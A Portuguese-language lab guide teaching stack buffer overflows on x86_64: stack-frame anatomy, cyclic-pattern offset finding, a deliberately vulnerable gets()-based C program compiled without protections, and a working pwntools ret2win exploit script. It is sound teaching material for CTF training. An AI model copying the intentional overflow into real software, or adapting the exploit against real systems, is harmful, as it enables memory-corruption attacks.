# Guia 04 — Exploração Binária: Anatomia da Pilha e Buffer Overflow
**Ciclo de Capacitação 2026.2 — Cyberguard Hub & Dojo pwn.college**  
**Classificação:** Educacional / Técnico  
**Público-Alvo:** Integrantes da Cyberguard (Foco em Exploração de Memória e Pwn)

---

## 1. O Paradoxo do `strcpy`: Da Teoria à Prática

No diagnóstico do ciclo 2026.2, a Cyberguard atingiu uma marca notável: **100% dos integrantes (8 de 8)** acertaram que a função `strcpy` em linguagem C é perigosa porque não realiza a checagem de limites (*bounds checking*) no buffer de destino.

No entanto, quando confrontados com o que acontece nos bastidores da memória — o funcionamento dos registradores e o controle de fluxo na CPU —, o índice de acerto caiu para zero.

Saber que uma função é insegura é o primeiro passo. Saber **como a CPU quebra**, **como a memória é corrompida** e **como construir um exploit funcional** é o que distingue um entusiasta de um profissional de segurança ofensiva.

---

## 2. Anatomia da Pilha (*Stack Frame*) em x86_64

A memória de um processo é dividida em vários segmentos: Código (`.text`), Dados (`.data`, `.bss`), Monte (`Heap`) e a **Pilha (`Stack`)**.

A pilha armazena variáveis locais de funções e gerencia o fluxo de chamadas e retornos.

### Propriedade Fundamental da Pilha em x86/x64:
> **A Pilha cresce para baixo** (dos endereços de memória mais altos em direção aos mais baixos).

Quando uma função (por exemplo, `vulneravel()`) é chamada:
1. O endereço da próxima instrução na função mãe (o endereço de retorno) é empilhado. Esse é o **Saved RIP**.
2. O Base Pointer da função mãe é empilhado: **Saved RBP**.
3. O ponteiro da pilha `RSP` é diminuído para abrir espaço para as variáveis locais da função.

### Diagrama da Stack Frame:

```
[ ENDEREÇOS ALTOS DE MEMÓRIA ]
|                                                  |
| Argumentos e dados do chamador (caller)          |
|--------------------------------------------------|
| SAVED RIP  (Endereço de Retorno - 8 bytes)       |  <--- O ALVO DO EXPLOIT!
|--------------------------------------------------|
| SAVED RBP  (Base Pointer anterior - 8 bytes)     |
|--------------------------------------------------|
| char buffer[64]                                  |  <--- Início do buffer na memória
| (Espaço de 64 bytes alocado para dados locais)   |  <--- RSP aponta aqui perto
|                                                  |
[ ENDEREÇOS BAIXOS DE MEMÓRIA ]
```

---

## 3. A Mecânica do Buffer Overflow

Quando uma função vulnerável como `strcpy(buffer, entrada_usuario)` copia bytes para dentro de `buffer[64]`:
* O `strcpy` começa a escrever no endereço mais baixo (`&buffer[0]`).
* Ele continua copiando byte a byte **em direção aos endereços mais altos**.
* Ele só para quando encontra um byte nulo terminador (`\0`).

Se o usuário fornecer uma entrada de **100 bytes**, os primeiros 64 bytes preenchem perfeitamente o array `buffer`. **Mas o que acontece com os 36 bytes restantes?**

```
+----------------+----------------+----------------+---------------------+
| buffer (64 B)  | Saved RBP (8B) | Saved RIP (8B) | Restante dos dados  |
+----------------+----------------+----------------+---------------------+
| 'A' x 64       | 'B' x 8        | 'C' x 8        | ...                 |
+----------------+----------------+----------------+---------------------+
  (Preenche buffer) (Esmaga RBP)     (ESMAGA O RIP!)
```

### O Momento do Sequestro de Fluxo:
Quando a função termina seu trabalho, ela executa a instrução `leave` (que restaura o RBP) e, em seguida, a instrução **`ret`**.

A instrução `ret` faz o equivalente a:
```assembly
pop rip
```
Ela retira o valor que está no topo da pilha e o carrega no registrador **RIP**! Se o atacante colocou o endereço de uma função secreta no lugar do Saved RIP, a CPU saltará imediatamente para ela!

Se o atacante colocou apenas lixo (como `0x4343434343434343` correspondente a `"CCCCCCCC"`), a CPU tentará buscar instruções nesse endereço inválido e o sistema operacional abortará o programa com **Segmentation Fault (SIGSEGV)**.

---

## 4. O Passo a Passo da Exploração Prática

Para explorar um Buffer Overflow clássico de redirecionamento de fluxo (*ret2win*), seguimos quatro passos:

```
PASSO 1: Descobrir o tamanho necessário para transbordar e atingir o RIP (Offset)
   │
PASSO 2: Localizar o endereço da função que desejamos executar (ex: win())
   │
PASSO 3: Construir o payload: [ Lixo até o offset ] + [ Endereço da win() ]
   │
PASSO 4: Enviar o payload e obter a flag!
```

### 4.1 Calculando o Offset Exato com Cyclic Patterns

Em vez de chutar a quantidade de bytes, usamos padrões cíclicos de Bruijn (sequências não repetitivas de caracteres de 4 em 4 bytes):

```bash
# Gerando um padrão de 100 caracteres usando pwntools / GEF:
cyclic 100
# Saída: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

Ao passar essa sequência para o programa dentro do GDB, o programa travará com SIGSEGV. No GEF, você verá o crash:
```
[!] SIGSEGV: Invalid access to memory address: 0x6161617461616173 ('saaataaav')
```
Agora basta perguntar ao utilitário em qual posição exata essa sequência ocorre:
```bash
cyclic -l 0x6161617461616173
# Retorno: 72
```
Pronto! Descobrimos matematicamente que precisamos enviar **exatamente 72 bytes de preenchimento** (padding) para encostar no Saved RIP. O 73º byte começará a reescrever o endereço de retorno.

---

## 5. Laboratório Prático Completo

### 5.1 O Código-Fonte Vulnerável (`vuln.c`)

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win() {
    printf("\n[+] SUCESSO! Fluxo sequestrado com sucesso!\n");
    printf("[+] FLAG{cyberguard_buffer_overflow_mastery_2026}\n");
    fflush(stdout);
}

void vulneravel() {
    char buffer[64];
    printf("Digite seu nome: ");
    // VULNERABILIDADE CLÁSSICA: gets() ou strcpy() não verificam tamanho!
    gets(buffer);
    printf("Bem-vindo, %s!\n", buffer);
}

int main() {
    vulneravel();
    return 0;
}
```

### 5.2 Compilando para Fins Didáticos

Para aprender a mecânica pura sem as proteções modernas do compilador (que estudaremos em módulos seguintes do pwn.college):
```bash
gcc -fno-stack-protector -no-pie -z execstack vuln.c -o vuln
```
* `-fno-stack-protector`: Desativa o Canary de pilha (sentinela que detecta estouro).
* `-no-pie`: Mantém os endereços do binário fixos (sem aleatorização de posição de código).

### 5.3 Encontrando o Endereço da Função Alvo (`win`)

Usamos o `objdump` ou o próprio `gdb`:
```bash
objdump -d -M intel vuln | grep "<win>:"
# Saída esperada:
# 0000000000401156 <win>:
```
O endereço de `win()` é `0x00401156`.

---

## 6. O Script de Exploit em Python com `pwntools`

A biblioteca `pwntools` é a ferramenta padrão de CTF e desenvolvimento de exploits no mundo real.

Salve o script como `exploit.py`:

```python
#!/usr/bin/env python3
from pwn import *

# Configuração do contexto da arquitetura (Linux x86_64, Little-Endian)
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# Nome do binário
binary_path = './vuln'
elf = ELF(binary_path)

# Endereço da função de vitória (extraído automaticamente ou manual)
win_address = elf.symbols['win']
log.info(f"Endereço de win(): {hex(win_address)}")

# Offset calculado via cyclic pattern (64 bytes de buffer + 8 bytes de RBP salvo)
offset = 72

# Construção do Payload:
# 1. Preenchimento de lixo (padding) de 72 bytes
# 2. Endereço da função win() empacotado em 64 bits (p64 = 8 bytes Little-Endian)
payload = b"A" * offset + p64(win_address)

# Iniciar o processo vulnerável localmente
p = process(binary_path)

# Enviar o payload na hora do prompt
p.recvuntil(b"Digite seu nome: ")
log.info("Enviando payload de estouro de pilha...")
p.sendline(payload)

# Receber e imprimir a flag na tela
saida = p.recvall(timeout=2)
print(saida.decode('latin-1'))
```

### Executando o Exploit:
```bash
python3 exploit.py
# [+] Endereço de win(): 0x401156
# [+] Enviando payload de estouro de pilha...
# Bem-vindo, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
# [+] SUCESSO! Fluxo sequestrado com sucesso!
# [+] FLAG{cyberguard_buffer_overflow_mastery_2026}
```

---

## 7. Dica Avançada para x86_64: O Mistério do Alinhamento de Pilha (SSE / MOVAPS)

Em distribuições Linux de 64 bits modernas (Ubuntu 20.04+), você pode montar o exploit perfeito, sobrescrever o RIP com o endereço de `win()`, e o programa travar bem no meio da execução do `printf` dentro de `win()`.

### Por que isso acontece?
A especificação AMD64 ABI exige que a pilha esteja **alinhada em 16 bytes** antes de executar chamadas a certas instruções vetoriais (instrução `movaps`). Quando você sobrescreve o RIP diretamente, a pilha pode ficar desalinhada por 8 bytes.

### A Solução Canônica: O "Gadget RET"
Adicione uma instrução `ret` inofensiva antes do endereço da função `win()`:
```python
# Gadget ret: uma única instrução 'ret' encontrada no binário
ret_gadget = 0x40101a  # Endereço de uma instrução ret avulsa

# Payload alinhado:
payload = b"A" * offset + p64(ret_gadget) + p64(win_address)
```
A CPU executa o `ret` neutro (que consome 8 bytes da pilha, realinhando-a perfeitamente em múltiplos de 16) e salta em seguida para `win()`, rodando sem qualquer travamento!
